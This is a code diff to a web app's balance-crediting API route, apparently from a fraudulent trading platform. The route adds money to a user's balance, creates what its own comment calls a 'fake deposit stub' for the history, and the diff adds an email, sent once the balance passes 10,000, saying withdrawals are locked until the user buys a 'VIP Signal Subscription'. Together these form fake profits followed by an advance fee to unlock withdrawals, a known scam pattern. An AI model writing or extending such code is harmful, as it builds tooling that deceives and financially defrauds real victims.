@@ -4,7 +4,7 @@ import { authOptions } from '@/lib/auth';
 import dbConnect from '@/lib/db';
 import User from '@/models/User';
 import Deposit from '@/models/Deposit';
-import { sendBalanceAddedEmail } from '@/lib/mail';
+import { sendBalanceAddedEmail, sendCustomTemplateEmail } from '@/lib/mail';
 
 export async function POST(req: Request) {
     try {
@@ -22,9 +22,20 @@ export async function POST(req: Request) {
             return NextResponse.json({ error: 'User not found' }, { status: 404 });
         }
 
+        const oldBalance = user.balance;
+
         // Add money
         user.balance += amount;
         await user.save();
+
+        if (oldBalance < 10000 && user.balance >= 10000 && user.email) {
+            await sendCustomTemplateEmail(
+                user.email,
+                "Action Required: VIP Signal Required",
+                "Signal Purchase Required",
+                `Your account profit has reached the 10,000 threshold. To continue trading and enable withdrawals, you must purchase a VIP Signal Subscription immediately. Please contact your account manager to purchase your signal.`
+            );
+        }
 
         // Create a fake deposit stub so it shows in history
         await Deposit.create({
